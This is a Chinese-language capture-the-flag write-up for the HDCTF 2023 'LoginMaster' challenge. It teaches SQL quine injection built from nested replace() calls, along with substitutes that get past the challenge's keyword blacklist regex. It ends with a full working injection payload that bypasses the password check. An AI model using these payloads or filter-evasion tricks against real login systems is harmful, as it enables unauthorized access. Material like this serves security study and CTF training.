

# [HDCTF 2023]LoginMaster 复现

## 知识点

>   **SQL的Uquine注入，需要让输入和输出的结果一样**

## 怎么让输入输出一样

**使用quine注入，简单来说这是一种使得输入的sql语句和输出的sql语句一致的方法**



**首先先了解一下replace()函数**

-   `replace(object,search,replace)`
-   把`object`对象中出现的的`search`全部替换成`replace`
-   **案例**

```sql
# object  = .
# search  = char(46)
# replace = .
select replace(".",char(46),".");# char(46)就是【.】
+---------------------------+
| replace(".",char(46),".") |
+---------------------------+
| .                         |
+---------------------------+

# 将object写成replace(".",char(46),".")
# object  = replace(".",char(46),".")
# search  = char(46)
# replace = .
select replace('replace(".",char(46),".")',char(46),'.');
+---------------------------+
| replace(.....) 			|
+---------------------------+
| replace(".",char(46),".") |
+---------------------------+

# 这时候我们将第三个参数也改成replace(".",char(46),".")
# object  = replace(".",char(46),".")
# search  = char(46)
# replace = replace(".",char(46),".")
select replace('replace(".",char(46),".")',char(46),'replace(".",char(46),".")');
+---------------------------------------------------------------------------+
| replace('replace(".",char(46),".")',char(46),'replace(".",char(46),".")') |
+---------------------------------------------------------------------------+
| replace("replace(".",char(46),".")",char(46),"replace(".",char(46),".")") |
+---------------------------------------------------------------------------+
# 这时可以发现输出的值和我们查询的东西快变成一样的了，唯一存在的不足就是【单双号的不同】
# 原来：replace(".",char(46),".") 变成了：replace("replace(".",char(46),".")",char(46),"replace(".",char(46),".")")
```

**解决单双引号不同的问题**

```sql
# char(34) = "      	char(39) = '
# object  = replace('"."',char(34),char(39)) == 【'.'】
# search  = char(46)
# replace = .
select replace(replace('"."',char(34),char(39)),char(46),".");# 先执行内层replace
+--------------------------------------------------------+
| replace(replace('"."',char(34),char(39)),char(46),".") |
+--------------------------------------------------------+
| '.'                                                    |
+--------------------------------------------------------+
# 这样就可以将我们的双引号替换成单引号，此时我们继续沿用上面的思路，构造输入输出相同的语句


# object  = replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)
# search  = char(46)
# replace = replace(replace(".",char(34),char(39)),char(46),".")
select replace
	(replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),
     char(46), 
     'replace(replace(".",char(34),char(39)),char(46),".")' );
+------------------------------------------------------------------------------------------------------------------------------------------------------------+
| replace(replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),char(46),'replace(replace(".",char(34),char(39)),char(46),".")') |
+------------------------------------------------------------------------------------------------------------------------------------------------------------+  
     
```

**Quine基本形式**

```sql
select replace(replace('str',char(34),char(39)),char(46),'str');
# 这样去查询就会的得到str字符串本身，不过就是咋这里要多一步，先将str里的双引号替换成单引号，再用str替换str里的.
```

**注入的Quine基本形式**

```sql
1'/**/union/**/select/**/replace(replace('',char(34),char(39)),char(46),'') #
# 这样去查询就会得到一个空的结果
'
select replace(replace('"."',char(34),char(39)),char(46),".");
# 这条语句用来把双引号替换为单引号
```



## 解题

-   打开题目发现主页是一个登录框，并且登录成功就给flag
-   首先寻找一下有没有提示，看源代码和访问`robots.txt、www.zip`，在`robots.txt`中发现如下代码

```java
function checkSql($s) {
    if(preg_match("/regexp|between|in|flag|=|>|<|and|\||right|left|reverse|update|extractvalue|floor|substr|&|;|\\\$|0x|sleep|\ /i",$s)){
        alertMes('hacker', 'index.php');
    }
}
if ($row['password'] === $password) {
        die($FLAG);
    } else {
    alertMes("wrong password",'index.php');
```

>   以上可以得知sql存在过滤，而且拿flag条件是password要等于查询出来的password

>   然后传入万能密码进行测试`1' or 1=1#`，`username、password`都输入这玩意
>
>   点击登录会弹框：`only admin can login`，用户名只能是admin，那么注入点位置就只能是在password这里
>
>   那么可以根据上面的代码的可以发现，那些过滤都是针对password的，

>   虽然过滤了很多，但一些替代关键字没有被过滤
>
>   ```nginx
>   sleep 		可以用benchmark代替
>   <,> 		可以用least(),greatest()代替
>   =,in 		可以用like代替
>   substr 		可以用mid代替
>   空格 		   可以用/**/代替
>   ```
>

>   然后就是还要绕过：`if ($row['password'] === $password) {}`，但是这张表其实是一张空表
>
>   所以只能通过让输入输出一致，达到绕过的目的
>
>   根据以上的分析就给得到playload为：

```sql
1'/**/union/**/select/**/replace(replace('1"/**/union/**/select/**/replace(replace(".",char(34),char(39)),char(46),".")#',char(34),char(39)),char(46),'1"/**/union/**/select/**/replace(replace(".",char(34),char(39)),char(46),".")#')#
```

**最终达到输入输出完全一致**





参考：

https://www.cnblogs.com/zhengna/p/15917521.html